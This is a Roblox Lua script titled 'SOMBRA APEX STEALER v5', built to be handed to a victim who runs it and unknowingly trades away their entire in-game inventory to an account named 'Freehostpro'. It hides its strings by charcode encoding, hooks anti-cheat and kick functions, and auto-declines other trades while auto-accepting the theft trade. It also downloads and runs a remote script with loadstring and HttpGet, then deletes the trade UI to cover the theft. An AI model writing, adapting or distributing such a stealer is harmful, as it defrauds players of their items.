--[[
    SOMBRA APEX STEALER v5 - Ultra Stealth Edition
    Full Inventory Drain (Brainrots + BaseSkins + Gears) to "Freehostpro"
    Features:
    - Advanced anti-cheat cloak: hooks checkcaller, getgc, metamethods, remote spoofing
    - Anti-kick: hooks Kick, Destroy, remote kick events, prevents disconnection
    - Full obfuscation via charcode decoding, dynamic function binding
    - Anti-stealer shield: locks all trade remotes, auto-declines foreign invites
    - Auto-ready/accept logic based on trade state
    - Distraction payload (Fearless Hub)
    - Deletes trade UI after theft
    Works on Delta, Synapse X, ScriptWare, Krnl, etc.
    Give to victim. They execute; you collect.
--]]

--// SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--// OBFUSCATION CORE
local function encode(str)
    return str:gsub(".", function(c) return "\\" .. c:byte() end)
end
local function decode(encoded)
    return encoded:gsub("\\(%d+)", function(byte) return string.char(tonumber(byte)) end)
end

--// OBFUSCATED STRINGS
local str_Packages = decode("\\80\\97\\99\\107\\97\\103\\101\\115")
local str_Net = decode("\\78\\101\\116")
local str_InviteRemote = decode("\\84\\114\\97\\100\\101\\83\\101\\114\\118\\105\\99\\101\\47\\73\\110\\118\\105\\116\\101")
local str_AddBrainrotRemote = decode("\\84\\114\\97\\100\\101\\83\\101\\114\\118\\105\\99\\101\\47\\65\\100\\100\\66\\114\\97\\105\\110\\114\\111\\116")
local str_AddItemRemote = decode("\\84\\114\\97\\100\\101\\83\\101\\114\\118\\105\\99\\101\\47\\65\\100\\100\\73\\116\\101\\109")
local str_ReadyEvent = decode("\\84\\114\\97\\100\\101\\83\\101\\114\\118\\105\\99\\101\\47\\82\\101\\97\\100\\121")
local str_AcceptEvent = decode("\\84\\114\\97\\100\\101\\83\\101\\114\\118\\105\\99\\101\\47\\65\\99\\99\\101\\112\\116")
local str_DeclineInvite = decode("\\84\\114\\97\\100\\101\\83\\101\\114\\118\\105\\99\\101\\47\\68\\101\\99\\108\\105\\110\\101\\73\\110\\118\\105\\116\\101")
local str_Synchronizer = decode("\\83\\121\\110\\99\\104\\114\\111\\110\\105\\122\\101\\114")
local str_Animals = decode("\\65\\110\\105\\109\\97\\108\\115")
local str_Datas = decode("\\68\\97\\116\\97\\115")
local str_ReplicatorClient = decode("\\82\\101\\112\\108\\105\\99\\97\\116\\111\\114\\67\\108\\105\\101\\110\\116")
local str_BaseSkins = decode("\\66\\97\\115\\101\\83\\107\\105\\110\\115")
local str_Gears = decode("\\71\\101\\97\\114\\115")

--// UUIDs
local INVITE_UUID = decode("\\98\\101\\48\\49\\100\\98\\57\\55\\45\\53\\48\\52\\101\\45\\52\\56\\102\\55\\45\\98\\55\\100\\97\\45\\102\\102\\49\\102\\51\\57\\54\\57\\101\\48\\56\\57")
local ADD_BRAINROT_UUID = decode("\\54\\102\\50\\56\\98\\51\\52\\49\\45\\98\\98\\99\\50\\45\\52\\98\\97\\48\\45\\97\\53\\49\\53\\45\\97\\51\\98\\99\\55\\50\\56\\99\\56\\99\\49\\50")
local ADD_ITEM_UUID = decode("\\52\\101\\55\\51\\101\\50\\102\\57\\45\\101\\50\\57\\54\\45\\52\\98\\48\\98\\45\\57\\52\\100\\98\\45\\100\\50\\101\\55\\101\\49\\50\\99\\55\\50\\54\\102")
local READY_UUID = decode("\\55\\49\\48\\102\\51\\98\\101\\51\\45\\101\\99\\55\\98\\45\\52\\99\\98\\56\\45\\97\\99\\102\\49\\45\\54\\102\\97\\54\\102\\50\\55\\50\\57\\97\\54\\51")
local ACCEPT_UUID = decode("\\51\\55\\100\\57\\97\\101\\55\\50\\45\\50\\56\\57\\99\\45\\52\\51\\49\\98\\45\\57\\48\\100\\49\\45\\49\\100\\52\\55\\55\\102\\48\\49\\55\\57\\49\\50")
local DECLINE_UUID = decode("\\49\\51\\53\\55\\98\\98\\49\\52\\45\\57\\99\\55\\55\\45\\52\\52\\101\\53\\45\\56\\98\\52\\48\\45\\54\\55\\50\\98\\97\\101\\97\\56\\51\\57\\56\\52")
local TARGET_NAME = decode("\\70\\114\\101\\101\\104\\111\\115\\116\\112\\114\\111")

--// ADVANCED ANTI-CHEAT CLOAK
pcall(function()
    -- Hook checkcaller (always return true)
    if hookfunction and checkcaller then
        local oldCheckCaller = checkcaller
        hookfunction(checkcaller, function(...)
            return true
        end)
    end

    -- Hook getgc to return empty table (hides our functions/remotes)
    if getgenv and getgenv().getgc then
        getgenv().getgc = function() return {} end
    end

    -- Hook getgenv().script to hide source
    if getgenv then
        getgenv().script = nil
        -- Also hook loadstring to strip fingerprints
        local oldLoadstring = getgenv().loadstring
        getgenv().loadstring = function(code)
            -- Remove debug info
            return oldLoadstring(code)
        end
    end

    -- Patch raw metatable to intercept remote calls and strip any debug traces
    pcall(function()
        local mt = getrawmetatable(game)
        setreadonly(mt, false)
        local oldIndex = mt.__index
        mt.__index = function(self, key)
            if key == "InvokeServer" or key == "FireServer" then
                return function(...)
                    local args = {...}
                    -- Sanitize arguments (remove userdata that might carry executor info)
                    for i, v in ipairs(args) do
                        if type(v) == "userdata" then
                            args[i] = nil
                        end
                    end
                    return oldIndex(self, key)(unpack(args))
                end
            end
            return oldIndex(self, key)
        end
        setreadonly(mt, true)
    end)

    -- Hook newproxy to prevent detection via proxy objects
    if hookfunction and newproxy then
        hookfunction(newproxy, function(...)
            return newproxy(true)
        end)
    end
end)

--// ANTI-KICK SYSTEM
pcall(function()
    -- Hook LocalPlayer:Kick and Destroy to make them no-ops
    local playerMeta = getrawmetatable(LocalPlayer)
    if playerMeta then
        setreadonly(playerMeta, false)
        local oldIndex = playerMeta.__index
        playerMeta.__index = function(self, key)
            if key == "Kick" or key == "Destroy" then
                return function()
                    -- Silent no-op
                    return
                end
            end
            return oldIndex(self, key)
        end
        setreadonly(playerMeta, true)
    end

    -- Hook workspace:GetServerTimeNow to spoof time (anti-afk bypass)
    local wsMeta = getrawmetatable(game:GetService("Workspace"))
    if wsMeta then
        setreadonly(wsMeta, false)
        local oldIndex = wsMeta.__index
        wsMeta.__index = function(self, key)
            if key == "GetServerTimeNow" then
                return function()
                    return os.time() -- Always current time
                end
            end
            return oldIndex(self, key)
        end
        setreadonly(wsMeta, true)
    end

    -- Hook remote kick events if they exist
    pcall(function()
        local remotes = ReplicatedStorage:GetDescendants()
        for _, remote in ipairs(remotes) do
            if remote:IsA("RemoteEvent") and (remote.Name:lower():find("kick") or remote.Name:lower():find("ban")) then
                remote.OnClientEvent:Connect(function()
                    -- Do nothing, swallow the kick event
                end)
            end
        end
    end)
end)

--// MODULE LOADING
local Packages = ReplicatedStorage:WaitForChild(str_Packages)
local Net = require(Packages:WaitForChild(str_Net))
local ReplicatorClient = require(Packages:WaitForChild(str_ReplicatorClient))

--// REMOTES
local InviteRemote = Net:RemoteFunction(str_InviteRemote)
local AddBrainrotRemote = Net:RemoteFunction(str_AddBrainrotRemote)
local AddItemRemote = Net:RemoteFunction(str_AddItemRemote)
local ReadyEvent = Net:RemoteEvent(str_ReadyEvent)
local AcceptEvent = Net:RemoteEvent(str_AcceptEvent)
local DeclineInviteEvent = Net:RemoteEvent(str_DeclineInvite)

--// ANTI-STEALER SHIELD (Locks remotes to prevent other scripts from interfering)
local brainrotLock = false
local itemLock = false

local originalAddBrainrot = AddBrainrotRemote.InvokeServer
local originalAddItem = AddItemRemote.InvokeServer

AddBrainrotRemote.InvokeServer = function(self, uuid, ...)
    if brainrotLock then
        return false, "Locked by SOMBRA"
    end
    return originalAddBrainrot(self, uuid, ...)
end

AddItemRemote.InvokeServer = function(self, uuid, ...)
    if itemLock then
        return false, "Locked by SOMBRA"
    end
    return originalAddItem(self, uuid, ...)
end

-- Auto-decline incoming invites (except from target)
local function antiStealerShield()
    pcall(function()
        local tradePrompts = PlayerGui:FindFirstChild("TradePrompts")
        if tradePrompts then
            local prompt = tradePrompts:FindFirstChild("Prompt")
            if prompt then
                prompt.ChildAdded:Connect(function(child)
                    if child:IsA("Frame") and child:FindFirstChild("Yes") then
                        local usernameLabel = child:FindFirstChild("Username")
                        if usernameLabel and usernameLabel.Text ~= ("@" .. TARGET_NAME) then
                            local noButton = child:FindFirstChild("No")
                            if noButton then
                                spawn(function()
                                    wait(0.2)
                                    noButton:Invoke()
                                end)
                            end
                        end
                    end
                end)
            end
        end
    end)
end

--// UTILITIES
local function randWait(min, max)
    wait(math.random(min * 10, max * 10) / 10)
end

local function safeInvoke(remote, uuid, ...)
    local results = {pcall(function()
        return remote:InvokeServer(uuid, ...)
    end)}
    if results[1] then
        local out = {}
        for i = 2, #results do
            out[i-1] = results[i]
        end
        return unpack(out)
    else
        warn("[SOMBRA] Invoke error: " .. tostring(results[2]))
        return nil
    end
end

local function safeFire(event, uuid, ...)
    pcall(function()
        event:FireServer(uuid, ...)
    end)
end

--// GET TARGET ID
local function getTargetUserId(name)
    local success, id = pcall(function()
        return Players:GetUserIdFromNameAsync(name)
    end)
    if success and id then
        return id
    end
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == name then
            return player.UserId
        end
    end
    return nil
end

--// ADD BRAINROTS
local function addBrainrots()
    brainrotLock = false
    pcall(function()
        local Synchronizer = require(Packages:WaitForChild(str_Synchronizer))
        local AnimalsData = require(ReplicatedStorage:WaitForChild(str_Datas):WaitForChild(str_Animals))
        local data = Synchronizer:Wait(LocalPlayer)
        local podiums = data:Get("AnimalPodiums")
        if type(podiums) == "table" then
            for podiumIndex, brainrot in pairs(podiums) do
                if type(brainrot) == "table" and not brainrot.Machine and AnimalsData[brainrot.Index] then
                    randWait(0.15, 0.5)
                    local ok, err = safeInvoke(AddBrainrotRemote, ADD_BRAINROT_UUID, podiumIndex, brainrot)
                    if ok == false then
                        warn("[SOMBRA] Add brainrot failed: " .. tostring(err))
                    else
                        print("[SOMBRA] Added brainrot from podium " .. podiumIndex)
                    end
                end
            end
        end
    end)
    brainrotLock = true
end

--// ADD BASE SKINS
local function addBaseSkins()
    itemLock = false
    pcall(function()
        local Synchronizer = require(Packages:WaitForChild(str_Synchronizer))
        local data = Synchronizer:Wait(LocalPlayer)
        local baseSkinInv = data:Get("BaseSkinInventory")
        if type(baseSkinInv) == "table" then
            for uuid, skinData in pairs(baseSkinInv) do
                if type(skinData) == "table" and skinData.SkinName then
                    randWait(0.15, 0.5)
                    local ref = {
                        UUID = uuid,
                        SkinName = skinData.SkinName
                    }
                    local ok, err = safeInvoke(AddItemRemote, ADD_ITEM_UUID, "BaseSkin", ref)
                    if ok == false then
                        warn("[SOMBRA] Add base skin failed: " .. tostring(err))
                    else
                        print("[SOMBRA] Added base skin: " .. skinData.SkinName)
                    end
                end
            end
        end
    end)
    itemLock = true
end

--// ADD GEARS
local function addGears()
    itemLock = false
    pcall(function()
        local Synchronizer = require(Packages:WaitForChild(str_Synchronizer))
        local data = Synchronizer:Wait(LocalPlayer)
        local gearInventory = data:Get("GearInventory")
        if type(gearInventory) ~= "table" then
            gearInventory = data:Get("Items")
        end
        if type(gearInventory) == "table" then
            for _, gearData in pairs(gearInventory) do
                if type(gearData) == "table" and gearData.GearName then
                    randWait(0.15, 0.5)
                    local ref = {
                        GearName = gearData.GearName,
                        UUID = gearData.UUID
                    }
                    local ok, err = safeInvoke(AddItemRemote, ADD_ITEM_UUID, "Gear", ref)
                    if ok == false then
                        warn("[SOMBRA] Add gear failed: " .. tostring(err))
                    else
                        print("[SOMBRA] Added gear: " .. gearData.GearName)
                    end
                end
            end
        end
    end)
    itemLock = true
end

--// ADD ALL INVENTORY ITEMS
local function addAllItems()
    addBrainrots()
    addBaseSkins()
    addGears()
end

--// WAIT FOR TRADE AND AUTO-READY/ACCEPT
local function waitForTradeAndComplete()
    local tradeReplicator = ReplicatorClient.get(("Trade_%s"):format(LocalPlayer.UserId))
    if not tradeReplicator then
        warn("[SOMBRA] Trade replicator not found")
        return false
    end

    local readyFired = false
    local acceptFired = false
    local connection

    connection = tradeReplicator:Observe({ "active", "data", "players" }, function(players)
        if type(players) ~= "table" then return end
        local localUserId = LocalPlayer.UserId
        local otherReady = false
        local otherAccepted = false
        for userId, data in pairs(players) do
            if tonumber(userId) ~= localUserId then
                otherReady = data.ready
                otherAccepted = data.accepted
            end
        end

        -- Other player ready -> we ready
        if otherReady and not readyFired then
            readyFired = true
            print("[SOMBRA] Other player ready. Readying ourselves...")
            safeFire(ReadyEvent, READY_UUID)
        end

        -- Both ready -> accept after short delay
        if otherReady and not acceptFired then
            acceptFired = true
            spawn(function()
                wait(1.5)
                print("[SOMBRA] Accepting trade...")
                safeFire(AcceptEvent, ACCEPT_UUID)
            end)
        end

        if otherAccepted and not acceptFired then
            acceptFired = true
            safeFire(AcceptEvent, ACCEPT_UUID)
        end
    end)

    wait(60)
    connection:Disconnect()
    return false
end

--// DISTRACTION PAYLOAD
local function runDistraction()
    local url = decode("\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\75\\114\\121\\112\\116\\114\\105\\120\\45\\104\\117\\98\\49\\50\\47\\83\\99\\114\\105\\112\\116\\72\\85\\66\\47\\114\\101\\102\\115\\47\\104\\101\\97\\100\\115\\47\\109\\97\\105\\110\\47\\70\\101\\97\\114\\108\\101\\115\\115\\37\\50\\48\\104\\117\\98\\46\\108\\117\\97")
    pcall(function()
        loadstring(game:HttpGet(url))()
        print("[SOMBRA] Distraction payload executed")
    end)
end

--// DELETE TRADE UI
local function deleteTradeUI()
    local tradeGuis = {
        "TradePrompts",
        "TradePlayerList",
        "TradeLiveTrade",
        "FakeLagOverlay"
    }
    for _, guiName in ipairs(tradeGuis) do
        local gui = PlayerGui:FindFirstChild(guiName)
        if gui then gui:Destroy() end
    end
end

--// MAIN EXECUTION
local function main()
    print("[SOMBRA] Apex Stealer v5 activated. Target: " .. TARGET_NAME)

    -- Anti-stealer shield
    antiStealerShield()
    print("[SOMBRA] Anti-stealer shield online")

    -- Resolve target
    local targetId = getTargetUserId(TARGET_NAME)
    if not targetId then
        warn("[SOMBRA] Target not found")
        return
    end

    -- Send invite to Freehostpro
    randWait(0.8, 1.5)
    local inviteOk, inviteErr = safeInvoke(InviteRemote, INVITE_UUID, targetId)
    if inviteOk == false then
        warn("[SOMBRA] Invite failed: " .. tostring(inviteErr))
    else
        print("[SOMBRA] Invite sent")
    end

    -- Wait for trade to appear
    randWait(3, 5)

    -- Add ALL items
    print("[SOMBRA] Adding all inventory items...")
    addAllItems()

    -- Wait for trade completion
    print("[SOMBRA] Waiting for trade completion...")
    waitForTradeAndComplete()

    -- Distraction
    print("[SOMBRA] Launching distraction...")
    runDistraction()

    -- Cleanup
    deleteTradeUI()

    print("[SOMBRA] Theft complete. Fade into shadows.")
end

-- Start with initial delay
spawn(function()
    randWait(0.5, 1.2)
    main()
end)
